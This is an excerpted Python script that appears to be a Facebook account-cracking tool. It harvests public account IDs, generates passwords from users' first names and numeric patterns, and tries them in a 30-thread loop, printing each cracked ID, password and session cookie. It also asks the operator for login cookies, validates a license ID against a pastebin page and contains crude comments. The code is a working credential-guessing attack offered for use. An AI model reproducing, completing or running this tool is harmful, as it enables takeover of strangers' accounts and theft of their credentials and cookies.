...
def chk(): 
  ...
  i4m_maro = "-".join(uuid) 
  print("\n\n\x1b[37;1m  YOUR ID : "+i4m_maro) 
  try: 
    Halbast = requests.get("https://pastebin.com/raw/rp80wcBa").text 
    if Halbast in Halbast:
      print("\033[92m  YOUR Your ID IS ACTIVE.........\033[97m") 
      msg = str(os.geteuid()) 
      time.sleep(1) 
      pass 
    else: 
      print("\x1b[91m\n\n  ID  ACTIV NiA  \n  Bo Activ KrNi ID Xo \n  Nama bnera \n  TeleGram :: @i4m_maro \033[97m") 
      time.sleep(1) 
      sys.exit() 
  except: 
    sys.exit() 
...
def login_lagi334():
	try:
		banner()
		___kontol___ = input('[|] Cookies dana : ')
		...
		print('\n b sarkaftyana daxl bo');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print('%s# COOKIES NA DRSTA / CP ACCOUNT '%(h))
		exit()
# I FUCKED YOU BRO TOOL NO MONEY IS FREE
...
def dump_publik():
	...
	sol().print(win2)
	print(x+''+h+'•'+x+' ')
	pil = input(x+'['+p+'f'+x+'] ID FACEBOOK DANE : ')
	try:
...
def passwrd():
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			frs = nmf.split(' ')[0]
			pwv = ['112233','556677','223344','445566','556677','889900','MARO12345']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					...
					pwv.append(frs+'1122441')
					pwv.append(frs+'12345543')
					pwv.append(frs+'098765432')
					pwv.append(frs+'112')
					pwv.append(frs+'1668786')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s👽MARO👽 %s/%s 👽OK:%s 👽CP:%s 👽 %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
...
def crack2(idf,pwv):
	...
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s👽MARO-START👽 %s/%s 👽Ok*%s 👽CP *%s 👽 %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
...
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no'in taplikasi:
					...
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='white')
					cetak(nel(statusok1, title='OK'))
					break
				elif 'ya'in taplikasi:
					ok+=1
